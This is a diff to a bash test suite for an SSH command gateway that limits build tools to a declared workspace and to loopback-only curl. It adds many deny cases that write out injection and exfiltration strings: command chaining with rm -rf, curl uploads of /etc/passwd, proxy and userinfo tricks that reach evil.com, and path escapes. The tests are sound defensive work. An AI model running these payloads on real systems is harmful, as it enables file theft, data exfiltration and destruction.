@@ -16,13 +16,21 @@ GATEWAY="$HERE/../container-build-gateway.sh"
 ZSH_BIN="${GATEWAY_TEST_ZSH:-$(command -v zsh || true)}"
 [ -n "$ZSH_BIN" ] || { echo "SKIP: zsh not found (set GATEWAY_TEST_ZSH)"; exit 2; }
 
-TMP="$(mktemp -d)"
+# Rooted under $HOME, NOT under `mktemp -d`'s default. The gateway's
+# path-argument check exempts a handful of read-only-by-convention prefixes,
+# and the temporary directories the profile already allows writing to are among
+# them (/tmp, /private/tmp, /var/folders). A harness living inside one of those
+# could not express an "outside the workspace" path at all: on Linux mktemp
+# gives /tmp/…, on macOS /var/folders/… — both exempt, so every path-escape
+# assertion below would pass for the wrong reason. $HOME is not exempt.
+TMP="$(mktemp -d "$HOME/.gateway-test.XXXXXX")"
 trap 'rm -rf "$TMP"' EXIT
 STUB="$TMP/bin"; FAKE_HOME="$TMP/home"
 mkdir -p "$STUB" "$FAKE_HOME"
 
 # Stubs: print a marker, their argv (one per line, bracketed), and cwd.
-for c in swift xcodebuild xcrun qmd curl pkill agent-browser; do
+for c in swift xcodebuild xcrun qmd curl pkill agent-browser \
+         mlx-whisper mlx_whisper xcodegen open; do
   cat > "$STUB/$c" <<EOF
 #!/usr/bin/env bash
 echo "STUB:$c cwd=\$PWD"
@@ -62,8 +70,20 @@ for a in "$@"; do echo "ARG:[$a]"; done
 EOF
 chmod +x "$FAKE_HOME/.local/bin/multiplai-docker.py"
 
+# The declared workspace. Path-taking commands are denied without it (fail
+# closed), so almost every test below needs one — the cases that assert the
+# denial remove it explicitly and put it back.
+#
+# The cd-prefix directories live INSIDE it, because a `cd` prefix that leaves
+# the workspace is now itself a denial. `$TMP/outside-ws` is deliberately not.
+WS_DIR="$TMP/ws"
+WS_DECL="$FAKE_HOME/.local/state/multiplai/workspace"
+mkdir -p "$WS_DIR" "$FAKE_HOME/.local/state/multiplai"
+echo "$WS_DIR" > "$WS_DECL"
+
 # Dirs exercising the cd prefix.
-mkdir -p "$TMP/gw test dir" "$TMP/gw (paren) dir" "$TMP/plain"
+mkdir -p "$WS_DIR/gw test dir" "$WS_DIR/gw (paren) dir" "$WS_DIR/plain"
+mkdir -p "$TMP/outside-ws"
 
 PASS=0; FAIL=0
 run_gw() {  # $1 = SSH_ORIGINAL_COMMAND; sets OUT, ERR, RC
@@ -92,10 +112,10 @@ expect_allow "curl loopback"               'curl http://localhost:8000/api'    "
 expect_allow "pkill simulator"             'pkill -f Simulator'                "STUB:pkill"
 
 echo "# cd prefix: escaped/quoted paths must reach cd unquoted"
-expect_allow "cd escaped space"   "cd $TMP/gw\\ test\\ dir && swift build"       "cwd=$TMP/gw test dir"
-expect_allow "cd escaped parens"  "cd $TMP/gw\\ \\(paren\\)\\ dir && swift build" "cwd=$TMP/gw (paren) dir"
-expect_allow "cd single-quoted"   "cd '$TMP/gw test dir' && swift build"          "cwd=$TMP/gw test dir"
-expect_allow "cd plain"           "cd $TMP/plain && swift build"                  "cwd=$TMP/plain"
+expect_allow "cd escaped space"   "cd $WS_DIR/gw\\ test\\ dir && swift build"       "cwd=$WS_DIR/gw test dir"
+expect_allow "cd escaped parens"  "cd $WS_DIR/gw\\ \\(paren\\)\\ dir && swift build" "cwd=$WS_DIR/gw (paren) dir"
+expect_allow "cd single-quoted"   "cd '$WS_DIR/gw test dir' && swift build"          "cwd=$WS_DIR/gw test dir"
+expect_allow "cd plain"           "cd $WS_DIR/plain && swift build"                  "cwd=$WS_DIR/plain"
 
 echo "# escaped metachars in argv are data, not shell"
 expect_allow "escaped paren scheme is one argv word" \
@@ -107,7 +127,7 @@ echo "# smuggling attempts stay denied"
 # here, the test would be checking that the gateway rejects the *result* of the
 # injection — after this harness had already run it.
 expect_deny "semicolon chain"           'swift build; rm -rf /tmp/x'          "metacharacter"
-expect_deny "&& chain after cd"         "cd $TMP/plain && rm -rf /tmp/x && swift build" "metacharacter"
+expect_deny "&& chain after cd"         "cd $WS_DIR/plain && rm -rf /tmp/x && swift build" "metacharacter"
 # shellcheck disable=SC2016  # literal payload, see above
 expect_deny "command substitution"      'swift build $(touch /tmp/pwned)'     "metacharacter"
 # shellcheck disable=SC2016  # literal payload, see above
@@ -118,7 +138,7 @@ expect_deny "unescaped paren"           'swift build (dev)'                   "m
 expect_deny "newline smuggle"           $'swift build\nrm -rf /tmp/x'         "metacharacter"
 expect_deny "escaped-backslash + live semicolon" 'swift build \\; rm -rf /tmp/x' "metacharacter"
 expect_deny "not allowlisted"           'rm -rf /tmp/x'                       "not in allowlist"
-expect_deny "cd unescaped space (two words)" "cd $TMP/gw test dir && swift build" "malformed cd prefix"
+expect_deny "cd unescaped space (two words)" "cd $WS_DIR/gw test dir && swift build" "malformed cd prefix"
 expect_deny "cd to metachar dir fails at cd" 'cd /tmp\ \&\&\ rm && swift build' "cd failed"
 expect_deny "interactive shell"         ''                                    "interactive"
 
@@ -234,6 +254,284 @@ expect_allow "non-navigation verb is untouched"     'agent-browser type hello'  
 rm -f "$HOST_BROWSER_FLAG"
 expect_deny "removing the flag closes it again" \
   'agent-browser snapshot'                          "host browser is not enabled"
+
+echo "# workspace jail: cwd is pinned, and a cd may not leave the workspace"
+# The reported escape: the forced command ran with cwd = the host user's HOME,
+# so `mlx_whisper --output-dir .` wrote into ~ on the Mac. With a declared
+# workspace and no explicit cd prefix, cwd must be the workspace.
+expect_allow "cwd is pinned to the declared workspace" \
+  'swift build'                                     "cwd=$WS_DIR"
+expect_allow "cd inside the workspace still works" \
+  "cd $WS_DIR/plain && swift build"                 "cwd=$WS_DIR/plain"
+expect_deny  "cd outside the workspace is denied" \
+  "cd $TMP/outside-ws && swift build"               "outside the declared workspace"
+expect_deny  "cd to the host home is denied" \
+  "cd $FAKE_HOME && swift build"                    "outside the declared workspace"
+expect_deny  "cd to / is denied" \
+  'cd / && swift build'                             "outside the declared workspace"
+# A string-prefix test would pass a sibling whose name merely starts with the
+# workspace path.
+mkdir -p "${WS_DIR}-evil"
+expect_deny  "sibling sharing the workspace prefix is denied" \
+  "cd ${WS_DIR}-evil && swift build"                "outside the declared workspace"
+# ...and a symlink out of the workspace must not launder the check.
+ln -sfn "$TMP/outside-ws" "$WS_DIR/escape-link"
+expect_deny  "symlink out of the workspace is denied" \
+  "cd $WS_DIR/escape-link && swift build"           "outside the declared workspace"
+
+echo "# workspace jail: a malformed declaration is not a declaration"
+echo "not/an/absolute/path" > "$WS_DECL"
+expect_deny "relative path in the declaration is refused" \
+  'swift build'                                     "not an existing absolute path"
+echo "/nonexistent/workspace/$$" > "$WS_DECL"
+expect_deny "declared path that does not exist is refused" \
+  'swift build'                                     "not an existing absolute path"
+echo "$WS_DIR" > "$WS_DECL"
+
+echo "# workspace jail: fail closed when nothing is declared"
+mv "$WS_DECL" "$WS_DECL.bak"
+# Path-taking commands stop.
+expect_deny "swift denied with no workspace declared" \
+  'swift build'                                     "no workspace declared"
+expect_deny "xcodebuild denied with no workspace declared" \
+  'xcodebuild -scheme App build'                    "no workspace declared"
+expect_deny "mlx-whisper denied with no workspace declared" \
+  'mlx-whisper --output-dir . audio.m4a'            "no workspace declared"
+expect_deny "qmd denied with no workspace declared" \
+  'qmd query hello'                                 "no workspace declared"
+expect_deny "xcrun denied with no workspace declared" \
+  'xcrun simctl list'                               "no workspace declared"
+# Commands that cannot express a path keep working — the upgrade must not take
+# the bridge diagnostic down with it.
+expect_allow "command -v survives with no workspace" \
+  'command -v swift'                                ""
+expect_allow "pkill survives with no workspace" \
+  'pkill -f Simulator'                              "STUB:pkill"
+expect_allow "curl survives with no workspace" \
+  'curl http://localhost:8000/api'                  "STUB:curl"
+expect_allow "gh-token survives with no workspace" \
+  'multiplai-gh-token --check myapp'                "STUB:multiplai-gh-token"
+expect_allow "multiplai-docker survives with no workspace" \
+  'multiplai-docker ps dolce'                       "STUB:multiplai-docker"
+mv "$WS_DECL.bak" "$WS_DECL"
+expect_allow "restoring the declaration reopens it" \
+  'swift build'                                     "STUB:swift"
+
+echo "# curl: a real flag ALLOWLIST — every write/read primitive is refused"
+# None of these had a test before, and every one of them was reachable: the
+# branch was a deny-list of six flags with an 'allowlist' header. Verified
+# against curl 8.5.0 that each really does touch a host file.
+expect_deny "curl --stderr writes an arbitrary path" \
+  'curl --stderr /tmp/pwned http://localhost:8000/'      "flag not allowed"
+expect_deny "curl --libcurl writes a source file" \
+  'curl --libcurl /tmp/pwned.c http://localhost:8000/'   "flag not allowed"
+expect_deny "curl --remote-name-all writes the body into cwd" \
+  'curl --remote-name-all http://localhost:8000/x'       "flag not allowed"
+expect_deny "curl --etag-save writes" \
+  'curl --etag-save /tmp/e http://localhost:8000/'       "flag not allowed"
+expect_deny "curl --etag-compare reads" \
+  'curl --etag-compare /etc/passwd http://localhost:8000/' "flag not allowed"
+expect_deny "curl --hsts writes" \
+  'curl --hsts /tmp/h http://localhost:8000/'            "flag not allowed"
+expect_deny "curl --alt-svc writes" \
+  'curl --alt-svc /tmp/a http://localhost:8000/'         "flag not allowed"
+expect_deny "curl --create-file-mode" \
+  'curl --create-file-mode 777 http://localhost:8000/'   "flag not allowed"
+expect_deny "curl -b reads a cookie file" \
+  'curl -b /etc/passwd http://localhost:8000/'           "flag not allowed"
+expect_deny "curl --cookie reads a cookie file" \
+  'curl --cookie /etc/passwd http://localhost:8000/'     "flag not allowed"
+expect_deny "curl -w @file exfiltrates to stdout" \
+  'curl -w @/etc/passwd http://localhost:8000/'          "flag not allowed"
+expect_deny "curl --write-out @file exfiltrates to stdout" \
+  'curl --write-out @/etc/passwd http://localhost:8000/' "flag not allowed"
+# The proxy is the egress hole: the URL stays loopback while the request goes
+# anywhere. It passed because url_ok() returned 0 for any word without `://`.
+expect_deny "curl --proxy gives arbitrary egress" \
+  'curl --proxy evil.com:8080 http://localhost:8000/'    "flag not allowed"
+expect_deny "curl -x gives arbitrary egress" \
+  'curl -x evil.com:8080 http://localhost:8000/'         "flag not allowed"
+# The six the old deny-list did name must of course still be denied.
+expect_deny "curl -o still denied"      'curl -o /tmp/x http://localhost:8000/'   "flag not allowed"
+expect_deny "curl -O still denied"      'curl -O http://localhost:8000/x'         "flag not allowed"
+expect_deny "curl -K still denied"      'curl -K /tmp/cfg http://localhost:8000/' "flag not allowed"
+expect_deny "curl -T still denied"      'curl -T /etc/passwd http://localhost:8000/' "flag not allowed"
+expect_deny "curl --unix-socket still denied" \
+  'curl --unix-socket /var/run/x http://localhost:8000/' "flag not allowed"
+expect_deny "curl --output-dir still denied" \
+  'curl --output-dir /tmp http://localhost:8000/'        "flag not allowed"
+# Unknown flags — including ones curl has not shipped yet — are the point of an
+# allowlist.
+expect_deny "curl unknown long flag" \
+  'curl --some-future-flag http://localhost:8000/'       "flag not allowed"
+expect_deny "curl unknown short flag" \
+  'curl -Z http://localhost:8000/'                       "flag not allowed"
+# A clustered short flag may not smuggle a value-taking letter past the scan.
+expect_deny "curl clustered -so is caught letter by letter" \
+  'curl -so /tmp/x http://localhost:8000/'               "flag not allowed: -o"
+expect_allow "curl clustered value-less shorts are fine" \
+  'curl -sSfL http://localhost:8000/api'                 "STUB:curl"
+# @file values read a host file for every -d spelling and for -H.
+expect_deny "curl -H @file"    'curl -H @/etc/passwd http://localhost:8000/' "value not allowed"
+expect_deny "curl -d @file"    'curl -d @/etc/passwd http://localhost:8000/' "value not allowed"
+expect_deny "curl --data=@file (= form)" \
+  'curl --data=@/etc/passwd http://localhost:8000/'      "value not allowed"
+expect_deny "curl --data-binary @file" \
+  'curl --data-binary @/etc/passwd http://localhost:8000/' "value not allowed"
+# --data-urlencode's file spelling puts the @ in the middle (name@file).
+expect_deny "curl --data-urlencode name@file" \
+  'curl --data-urlencode x@/etc/passwd http://localhost:8000/' "value not allowed"
+# ...but an email address in an ordinary -d body is not an attack.
+expect_allow "curl -d with an @ inside the value is fine" \
+  'curl -d email=a@b.com http://localhost:8000/api'      "ARG:[email=a@b.com]"
+# Targets: no scheme is not "nothing to check", it is a denial.
+expect_deny "curl bare hostname target"  'curl evil.com'                     "target not allowed"
+expect_deny "curl external URL"          'curl http://evil.com/'             "target not allowed"
+expect_deny "curl file: target"          'curl file:///etc/passwd'           "target not allowed"
+expect_deny "curl localhost-prefixed host" \
+  'curl http://localhost.evil.com/'                      "target not allowed"
+# Userinfo: curl reads `localhost:8000` as user:password and connects to
+# evil.com. A prefix match on "http://localhost" cannot see that.
+expect_deny "curl userinfo smuggles the real host" \
+  'curl http://localhost:8000@evil.com/'                 "target not allowed"
+expect_deny "curl userinfo on 127.0.0.1" \
+  'curl http://127.0.0.1@evil.com/'                      "target not allowed"
+expect_deny "curl non-numeric port" \
+  'curl http://localhost:80x0/'                          "target not allowed"
+expect_deny "curl ftp scheme"     'curl ftp://localhost/x'   "target not allowed"
+expect_allow "curl bare loopback host, no port" \
+  'curl http://localhost'                                "STUB:curl"
+expect_allow "curl IPv6 loopback with a port" \
+  'curl http://[::1]:9222/json/version'                  "STUB:curl"
+expect_deny "curl --url takes the same test" \
+  'curl --url evil.com'                                  "value not allowed"
+expect_deny "curl --url file:"           'curl --url file:///etc/passwd'     "value not allowed"
+expect_deny "curl with no target at all" 'curl -X POST'                      "not in allowlist"
+expect_deny "curl bare"                  'curl'                              "not in allowlist"
+# Value shapes.
+expect_deny "curl --max-time non-numeric" \
+  'curl --max-time abc http://localhost:8000/'           "value not allowed"
+expect_deny "curl value-less flag given a value" \
+  'curl --silent=5 http://localhost:8000/'               "takes no value"
+expect_deny "curl flag missing its value" \
+  'curl http://localhost:8000/ --header'                 "needs a value"
+# What the bridge actually has to keep working: the host-browser skill's probe.
+expect_allow "curl host-browser probe" \
+  'curl -s --max-time 5 http://127.0.0.1:9222/json/version' "STUB:curl"
+expect_allow "curl --flag=value form" \
+  'curl --max-time=5 http://localhost:8000/api'          "STUB:curl"
+expect_allow "curl POST with headers and inline data" \
+  'curl -X POST -H Content-Type:application/json -d a=1 http://localhost:8000/api' \
+  "ARG:[-X]"
+expect_allow "curl --url form" \
+  'curl -s --url http://127.0.0.1:9222/json/version'     "STUB:curl"
+# ~/.curlrc could reintroduce `output`/`remote-name-all` behind the allowlist,
+# so the gateway pins -q as the FIRST argument, host-side.
+expect_allow "curl runs with -q first, ahead of every client word" \
+  'curl http://localhost:8000/api' \
+  "$(printf 'ARG:[-q]\nARG:[http://localhost:8000/api]')"
+
+echo "# open -a: an exact app name, not a prefix glob"
+expect_allow "open -a Simulator"     'open -a Simulator'          "STUB:open"
+expect_deny  "open -a path traversal out of the workspace" \
+  'open -a Simulator/../Evil.app'                        "app not allowed"
+expect_deny  "open -a absolute bundle path" \
+  'open -a /tmp/Evil.app'                                "app not allowed"
+expect_deny  "open -a prefix match is no longer enough" \
+  'open -a SimulatorEvil'                                "app not allowed"
+expect_deny  "open -a takes no trailing arguments" \
+  'open -a Simulator /etc/passwd'                        "exactly"
+expect_deny  "open without -a"       'open /etc/passwd'           "not in allowlist"
+expect_deny  "open -e"               'open -e /etc/passwd'        "not in allowlist"
+
+echo "# path arguments: an allowlisted command may not be POINTED outside the workspace"
+# Neither cwd pinning nor the cd-prefix check touches these — they bound where a
+# command starts, not where its arguments point — and with the sandbox layer
+# absent (the state that ships first) they were wholly unbounded.
+expect_allow "mlx_whisper writing inside the workspace" \
+  "mlx_whisper --output-dir $WS_DIR/out audio.m4a"       "STUB:mlx_whisper"
+expect_deny  "mlx_whisper --output-dir to an absolute path outside" \
+  "mlx_whisper --output-dir $TMP/outside-ws audio.m4a"   "outside the declared workspace"
+expect_deny  "mlx-whisper --output-dir to the host home" \
+  "mlx-whisper --output-dir $FAKE_HOME audio.m4a"        "outside the declared workspace"
+expect_deny  "mlx_whisper --output-dir traverses out with .." \
+  'mlx_whisper --output-dir ../../.. audio.m4a'          "outside the declared workspace"
+expect_deny  "xcodebuild -derivedDataPath outside" \
+  "xcodebuild -derivedDataPath $TMP/outside-ws build"    "outside the declared workspace"
+expect_deny  "xcodebuild build setting SYMROOT= outside" \
+  "xcodebuild SYMROOT=$TMP/outside-ws build"             "outside the declared workspace"
+expect_deny  "swift --scratch-path outside" \
+  "swift build --scratch-path $TMP/outside-ws"           "outside the declared workspace"
+expect_deny  "xcodegen --spec outside" \
+  "xcodegen --spec $TMP/outside-ws/project.yml"          "outside the declared workspace"
+expect_deny  "--flag=/abs form is checked too" \
+  "mlx_whisper --output-dir=$TMP/outside-ws audio.m4a"   "outside the declared workspace"
+expect_deny  "a .. escape through the workspace itself" \
+  "swift build --scratch-path $WS_DIR/../outside-ws"     "outside the declared workspace"
+expect_deny  "qmd path argument outside" \
+  "qmd get $TMP/outside-ws/note.md"                      "outside the declared workspace"
+expect_deny  "xcrun simctl install from outside the workspace" \
+  "xcrun simctl install booted $TMP/outside-ws/App.app"  "outside the declared workspace"
+expect_allow "swift --scratch-path inside is fine" \
+  "swift build --scratch-path $WS_DIR/build"             "STUB:swift"
+# Reads of the system toolchain are deliberately still allowed — confine.sb
+# leaves reads open, so refusing an SDK path here would be a false denial.
+expect_allow "xcodebuild -sdk under /Applications/Xcode.app" \
+  'xcodebuild -sdk /Applications/Xcode.app/Contents/Developer build' "STUB:xcodebuild"
+expect_allow "xcodebuild -derivedDataPath under /tmp" \
+  'xcodebuild -derivedDataPath /tmp/dd build'            "STUB:xcodebuild"
+# The check is keyed off NEEDS_WS, so branches that cannot express a path are
+# untouched by it.
+expect_allow "curl is not subject to the path check" \
+  'curl -s http://127.0.0.1:9222/json/version'           "STUB:curl"
+
+echo "# workspace declaration: / and \$HOME are not boundaries"
+echo "/" > "$WS_DECL"
+expect_deny "declaring / is refused" \
+  'swift build'                                          "which is not a"
+echo "$FAKE_HOME" > "$WS_DECL"
+expect_deny "declaring \$HOME itself is refused" \
+  'swift build'                                          "your home directory"
+ln -sfn "$FAKE_HOME" "$TMP/home-link"
+echo "$TMP/home-link" > "$WS_DECL"
+expect_deny "a symlink to \$HOME is refused too" \
+  'swift build'                                          "your home directory"
+echo "$WS_DIR" > "$WS_DECL"
+expect_allow "a subdirectory of \$HOME is a fine workspace" \
+  'swift build'                                          "STUB:swift"
+
+echo "# the two enforcement layers agree on ONE resolved workspace string"
+# Declare a symlink to the workspace. The cd check compares resolved paths and
+# sandbox-exec matches (subpath …) against resolved paths, so the declared
+# value has to be resolved once, up front, and used for both. Observable here
+# as: cwd is the RESOLVED directory, not the link.
+ln -sfn "$WS_DIR" "$TMP/ws-link"
+echo "$TMP/ws-link" > "$WS_DECL"
+expect_allow "a symlinked declaration pins cwd to the resolved workspace" \
+  'swift build'                                          "cwd=$WS_DIR"
+expect_allow "a cd through the declared symlink still resolves and passes" \
+  "cd $TMP/ws-link/plain && swift build"                 "cwd=$WS_DIR/plain"
+expect_deny  "and containment still holds under the symlinked declaration" \
+  "cd $TMP/outside-ws && swift build"                    "outside the declared workspace"
+echo "$WS_DIR" > "$WS_DECL"
+
+echo "# the cd that is checked is the cd that is used"
+# One `cd -P`, then `pwd -P` is re-read from the directory we are standing in.
+# The observable consequence: a symlink inside the workspace lands the process
+# in the PHYSICAL target, so nothing can be re-resolved after the check.
+ln -sfn "$WS_DIR/plain" "$WS_DIR/plain-link"
+expect_allow "cd through an in-workspace symlink ends at the physical path" \
+  "cd $WS_DIR/plain-link && swift build"                 "cwd=$WS_DIR/plain"
+
+echo "# workspace jail: no sandbox-exec on this host degrades to cwd pinning"
+# sandbox-exec is macOS-only and pinned to /usr/bin by the gateway, so on Linux
+# the wrap is skipped. The command must still run, and still run confined to the
+# workspace by cwd — the layer that fixes the reported escape.
+if [ ! -x /usr/bin/sandbox-exec ]; then
+  expect_allow "runs without sandbox-exec present" 'swift build' "cwd=$WS_DIR"
+else
+  echo "  skip- sandbox-exec present; wrap is exercised on the host"
+fi
 
 echo
 echo "gateway-test: $PASS passed, $FAIL failed"
